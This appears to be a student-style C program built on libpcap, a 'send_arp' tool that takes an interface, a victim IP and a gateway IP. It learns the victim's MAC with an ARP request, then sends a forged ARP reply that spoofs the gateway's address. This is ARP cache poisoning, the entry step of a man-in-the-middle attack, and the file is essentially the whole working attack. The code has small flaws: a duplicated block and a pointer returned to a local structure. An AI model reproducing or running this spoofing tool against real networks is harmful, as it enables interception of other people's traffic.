

#include"arp_head.h"



void Usage();
unsigned char * mymac(const char * dev);
int main(int argc, char *argv[]) {

    if(argc != 4){
        Usage();
        return -1;
    }

    ARP *arp = (ARP*)malloc(sizeof(ARP));
    struct pcap_pkthdr* header;
    const u_char *pac;
    unsigned char myip[4];
    const char *dev = argv[1];
    unsigned char* packet;
    unsigned char* packet2;
    unsigned char *my_mac=NULL;
    int index=0;
    const u_char *Sender_mac=NULL;
    char errbuf[PCAP_ERRBUF_SIZE];
    uint8_t ipv4_addr1[4];
    uint8_t ipv4_addr2[4];

    inet_pton(AF_INET, argv[2] ,ipv4_addr1);
    inet_pton(AF_INET,argv[3], ipv4_addr2);

    pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1000,errbuf); // open enp0s3 interface
   
    my_mac = mymac(dev);  // Get my mac

    for(int i=0; i<6; i++){
    arp->Dmac[i] = 0xff; // request packet -> To know sender`s mac address
    }

    for(int i=0; i<6; i++){
    arp->Smac[i] = my_mac[i]; // input my mac address
 }
    arp->type = htons(0x0806);  // ARP protocol value

    arp->HwType = htons(0x0001);
    arp->ProtoType = htons(0x0800);
    arp->HwSize =0x06;
    arp->ProtoSize = 0x04;

    arp->Opcode = htons(0x0001);  // request Opcode : 1 reply : 2

    for(int i=0; i<6; i++){
        arp->SenderMac[i] = my_mac[i];
    }

    arp->SenderIp[0] = 0x00;
    arp->SenderIp[1] = 0x00;
    arp->SenderIp[2] = 0x00;
    arp->SenderIp[3] = 0x00;

    for(int i=0; i<6; i++){
        arp->TargetMac[i] = 0;
    }
    for(int i=0; i<4; i++){
        arp->TargetIp[i] = ipv4_addr1[i];
    }
    packet= (unsigned char *)arp;

    pcap_sendpacket(handle, packet, 42);

        int res = pcap_next_ex(handle, &header, &pac);
        
        if(res == 1){
            Sender_mac = pac;
            for(int i=0; i<6; i++){
                Sender_mac = pac + 6;
                 printf("%02X:", Sender_mac[i]);
            }
            }

            printf("\n");

            for(int i=0; i<6; i++)
                arp->Dmac[i] = Sender_mac[i];

            arp->Opcode = htons(0x0002);

            for(int i=0; i<4; i++)
                arp->SenderIp[i] = ipv4_addr2[i];


            packet2=(unsigned char *)arp;

            for(int i=0; i<6; i++)
                arp->Dmac[i] = Sender_mac[i];

            arp->Opcode = htons(0x0002);

        for(int i=0; i<4; i++)
            arp->SenderIp[i] = ipv4_addr2[i];


        packet2=(unsigned char *)arp;

   pcap_sendpacket(handle, packet2, 42);

}

void Usage(){
    printf("Invalid Command..\n");
    printf("Send_arp <inf> <vic> <gate>\n");
}


unsigned char * mymac(const char * dev){

    struct ifreq ifr;
    int sock;
    unsigned char *mac=NULL;

    memset(&ifr, 0x00, sizeof(ifr));
    strcpy(ifr.ifr_name, dev);

    int fd = socket(AF_UNIX, SOCK_DGRAM,0);

    if((sock = socket(AF_UNIX, SOCK_DGRAM, 0))< 0){
        perror("socket");
    }
    if(ioctl(fd, SIOCGIFHWADDR, &ifr) < 0){
        perror("ioctl ");
    }
    mac = (unsigned char *)ifr.ifr_hwaddr.sa_data;


    return mac;
}

